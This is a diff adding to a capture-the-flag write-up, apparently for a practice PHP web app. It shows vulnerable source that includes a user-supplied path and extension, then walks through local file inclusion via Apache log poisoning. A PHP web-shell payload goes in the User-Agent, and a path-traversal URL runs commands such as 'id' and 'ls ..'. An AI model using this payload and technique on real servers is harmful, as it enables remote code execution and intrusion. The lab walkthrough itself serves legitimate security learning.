@@ -74,4 +74,38 @@ Hence, to get the flag, we pass the value `http://<machine_ip>/?view=php://filte
 
 We decode the base64 string and get our first flag.
 
+Having access to php files on the server, we need to figure out how to get more access.\
+Let's get the index file (same directory as flag.php) and see how the app actually works.
+```PHP
+<...snip...>
+        <?php
+            function containsStr($str, $substr) {
+                return strpos($str, $substr) !== false;
+            }
+            $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
+            if(isset($_GET['view'])) {
+                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
+                    echo 'Here you go!';
+                    include $_GET['view'] . $ext;
+                } else {
+                    echo 'Sorry, only dogs or cats are allowed.';
+                }
+            }
+        ?>
+<...snip...>
+```
+First, we now validate how the app decides when a value of *view* is valid. And second, the url argument *ext* is used to specify the extension of the file to include and thus, we can now include whatever file (according to permissions) on the server.
+
+One common method to exploit LFI vulnerabilities is log poisonning. For this, we poison our user-agent to acheive RCE when we include the log file.\
+
+- Log file location : `/var/log/apache2/access.log`
+- User Agent : `<h1><?php system($_GET['cmd']); ?></h1>`
+- Result when visiting `http://<machine_ip>/?view=cats/../../../../var/log/apache2/access.log&ext=&cmd=id`
+<screenshot>
+
+Now that we can execute commands on the target machine, let's discover files there.\
+We find the second flag on the parent folder of where the app lives (execute command `ls ..`).
+
+
+
 
